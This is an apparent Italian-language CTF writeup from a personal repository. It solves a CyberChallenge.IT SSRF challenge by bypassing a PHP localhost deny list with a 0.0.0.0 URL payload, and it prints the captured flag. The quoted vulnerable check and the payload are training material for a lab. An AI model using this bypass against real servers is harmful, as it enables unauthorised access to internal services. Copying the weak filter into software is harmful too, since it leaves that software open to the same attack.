# CTF Writeups & HTB Machines 💀

In questo repository archiviamo tutte le writeups di CTF (Capture The Flag) e macchine HTB (Hack The Box) che ho completato.

## Contenuti 📚
- **CTF Writeups**: Soluzioni dettagliate delle sfide CTF
- **HTB Machines**: Guide complete per le macchine Hack The Box

## Contributi 🤝
Per contribuire con un writeup, contattami via email: `luca.crippa05@gmail.com`

## Licenza ⚖️
Repository condivisa per scopi educativi. Rispetta sempre le policy delle piattaforme quando condividi materiale.

---

# Writeup: WS_1.05 - ssrf basics - level 2

## Overview
- **Categoria:** Web
- **Autore:** bonaff
- **Difficoltà:** 483
- **Stato:** Up (last checked: 11 minutes ago)
- **URL:** [http://ssrf2.challs.cyberchallenge.it/](http://ssrf2.challs.cyberchallenge.it/)

## Descrizione 📝
Questa è la seconda parte della challenge SSRF di base. A differenza del livello 1, in questo caso l'applicazione applica un piccolo controllo sull'indirizzo URL fornito. Il codice eseguito dal server è il seguente:
```php
if(in_array($host, ['localhost', '127.0.0.1']))
        die('Not a valid URL');
echo file_get_contents($url);
return;
```
Questo controllo impedisce di utilizzare direttamente `localhost` o `127.0.0.1` per forzare il server a eseguire richieste interne. Tuttavia, esiste una semplice tecnica per bypassare questo filtro.

## Soluzione 🎯

### 1. Bypass del Controllo
Il controllo blocca solo `localhost` e `127.0.0.1`. Per bypassare la restrizione, possiamo utilizzare l'indirizzo `0.0.0.0`, che equivale a `localhost` ma non viene filtrato.

### 2. Esecuzione dell'Exploit
Basta quindi inviare una richiesta con il parametro `url` impostato su:
```
http://ssrf2.challs.cyberchallenge.it/?url=http://0.0.0.0/get_flag.php
```
Il server eseguirà la richiesta verso `http://0.0.0.0/get_flag.php` e restituirà il contenuto della flag.

### 3. Ottenimento della Flag
Visitando l'URL sopra, si ottiene la seguente flag:

## Flag 🏁
```
CCIT{e0dd06ce49051c9d43bd01dbc4fbeb0e}
```

## Lezioni Apprese 📚
- **Bypass dei Filtri:** Anche controlli apparentemente efficaci possono essere aggirati con tecniche creative, come l'uso di indirizzi alternativi (ad es. `0.0.0.0`).
- **Validazione degli Input:** È fondamentale implementare controlli più rigorosi sugli input, specialmente per URL che portano a richieste interne.
- **Importanza dei Controlli di Sicurezza:** Anche piccole falle nel controllo degli input possono essere sfruttate per ottenere informazioni sensibili.

## Tools Utilizzati 🛠️
- **Browser Web:** Per testare direttamente la vulnerabilità modificando il parametro `url`.
- **Burp Suite (opzionale):** Per intercettare e analizzare le richieste HTTP.

---

*Writeup by Luca Crippa - Last Updated: 2024*
